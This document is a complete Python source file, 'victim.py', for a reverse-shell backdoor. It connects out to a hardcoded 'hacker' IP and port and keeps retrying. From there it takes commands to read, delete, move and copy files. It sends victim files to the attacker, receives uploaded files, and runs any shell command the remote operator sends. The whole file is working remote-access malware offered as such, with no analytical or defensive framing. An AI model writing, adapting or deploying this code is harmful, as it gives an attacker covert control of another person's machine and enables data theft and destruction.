# victim.py
import socket
import subprocess
import os
import time
import sys
import shutil
import shlex

HACKER_IP = "192.168.1.7"
HACKER_PORT = 8008
IDENTIFIER = "<END_OF_COMMAND_RESULT>"
RECONNECT_DELAY = 5
BUFFER_SIZE = 4096

victim_socket = None

def execute_command(command):
    global victim_socket
    try:
        command = command.strip()
        if not command:
            return "Error: Empty command"

        if command.lower().startswith("cd "):
            path = command[3:].strip().strip('"')
            try:
                os.chdir(path)
                return f"Changed directory to {os.getcwd()}"
            except Exception as e:
                return f"Error changing directory: {e}"

        if command.lower() == "ls":
            try:
                return "\n".join(os.listdir())
            except Exception as e:
                return f"Error listing files: {e}"

        if command.lower().startswith("cat "):
            filename = command[4:].strip().strip('"')
            try:
                with open(filename, "r") as f:
                    content = f.read()
                return content
            except Exception as e:
                return f"Error reading file: {e}"

        if command.lower().startswith("touch "):
            filename = command[6:].strip().strip('"')
            try:
                with open(filename, "w"): pass
                return f"File created: {filename}"
            except Exception as e:
                return f"Error creating file: {e}"

        if command.lower().startswith("rm "):
            filename = command[3:].strip().strip('"')
            try:
                if os.path.isdir(filename):
                    shutil.rmtree(filename)
                    return f"Directory deleted: {filename}"
                else:
                    os.remove(filename)
                    return f"File deleted: {filename}"
            except Exception as e:
                return f"Error deleting: {e}"

        if command.lower().startswith("cp "):
            parts = shlex.split(command)
            if len(parts) != 3:
                return "Usage: cp <source> <destination>"
            src = parts[1]
            dst = parts[2]
            try:
                abs_src = os.path.abspath(src)
                abs_dst = os.path.abspath(dst)
                if not os.path.isfile(abs_src):
                    return f"Source file does not exist: {abs_src}"
                if os.path.isdir(abs_dst):
                    abs_dst = os.path.join(abs_dst, os.path.basename(abs_src))
                shutil.copy2(abs_src, abs_dst)
                return f"Copied {abs_src} to {abs_dst}\nConfirmed: {os.path.exists(abs_dst)}"
            except Exception as e:
                return f"Error copying file: {e}"

        if command.lower().startswith("mv "):
            parts = shlex.split(command)
            if len(parts) != 3:
                return "Usage: mv <source> <destination>"
            src = parts[1]
            dst = parts[2]
            try:
                abs_src = os.path.abspath(src)
                abs_dst = os.path.abspath(dst)
                
                if not os.path.exists(abs_src):
                    return f"Source path does not exist: {abs_src}"
                
                # If destination is a directory, move into it with same name
                if os.path.isdir(abs_dst):
                    abs_dst = os.path.join(abs_dst, os.path.basename(abs_src))
                
                # Create parent directory if it doesn't exist
                os.makedirs(os.path.dirname(abs_dst), exist_ok=True)
                
                shutil.move(abs_src, abs_dst)
                return f"Moved {abs_src} to {abs_dst}\nConfirmed: {os.path.exists(abs_dst)}"
            except Exception as e:
                return f"Error moving file: {e}"

        if command.lower().startswith("download "):
            try:
                parts = shlex.split(command)
                if len(parts) != 3:
                    return "ERROR: Usage: download <source_path> <ignored>"
                src_path = parts[1]
                if not os.path.isfile(src_path):
                    return f"ERROR: File does not exist: {src_path}"

                with open(src_path, "rb") as f:
                    file_data = f.read()

                file_size = len(file_data)
                print(f"[DEBUG] Sending file: {src_path} ({file_size} bytes)")

                victim_socket.sendall(f"{file_size}".encode())
                ready = victim_socket.recv(16)
                if ready.decode().strip().upper() == "READY":
                    victim_socket.sendall(file_data)
                return None  # Skip IDENTIFIER
            except Exception as e:
                return f"ERROR: Could not send file: {e}"

        if command.lower().startswith("upload "):
            try:
                parts = command.split()
                if len(parts) < 4:
                    return "ERROR: Invalid upload command"
                
                filename = parts[1]
                dest_path = parts[2]
                file_size = int(parts[3])
                
                victim_socket.sendall("READY".encode())
                
                received = 0
                file_data = b""
                while received < file_size:
                    chunk = victim_socket.recv(min(BUFFER_SIZE, file_size - received))
                    if not chunk:
                        break
                    file_data += chunk
                    received += len(chunk)
                
                # Create destination directory if it doesn't exist
                os.makedirs(dest_path, exist_ok=True)
                
                # Handle if destination is directory or full path
                if os.path.isdir(dest_path):
                    save_path = os.path.join(dest_path, filename)
                else:
                    save_path = dest_path
                    os.makedirs(os.path.dirname(save_path), exist_ok=True)
                
                with open(save_path, "wb") as f:
                    f.write(file_data)
                
                return f"[+] File received and saved to: {save_path}\nFile size: {os.path.getsize(save_path)} bytes"
            except Exception as e:
                return f"ERROR: Could not receive file: {e}"

        # Shell command fallback
        process = subprocess.Popen(
            command, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            text=True
        )
        output, error = process.communicate()
        return output if output else error

    except Exception as e:
        return f"Execution error: {e}"

def start_victim_client():
    global victim_socket
    while True:
        try:
            victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            victim_socket.settimeout(None)
            print(f"[*] Connecting to {HACKER_IP}:{HACKER_PORT}...")
            victim_socket.connect((HACKER_IP, HACKER_PORT))
            print("[+] Connected to hacker")

            while True:
                data = victim_socket.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
                if not data:
                    print("[-] Disconnected by server")
                    break

                command = data.strip()
                print(f"[*] Executing: {command}")

                if command.lower() == "stop":
                    print("[+] Stopping as requested...")
                    victim_socket.close()
                    sys.exit(0)

                result = execute_command(command)
                if result is not None:
                    victim_socket.sendall(f"{result}{IDENTIFIER}".encode())

        except ConnectionRefusedError:
            print(f"[-] Connection refused, retrying in {RECONNECT_DELAY}s...")
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            if victim_socket:
                victim_socket.close()
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    try:
        start_victim_client()
    except KeyboardInterrupt:
        print("\n[!] Terminated by user")
        sys.exit(0)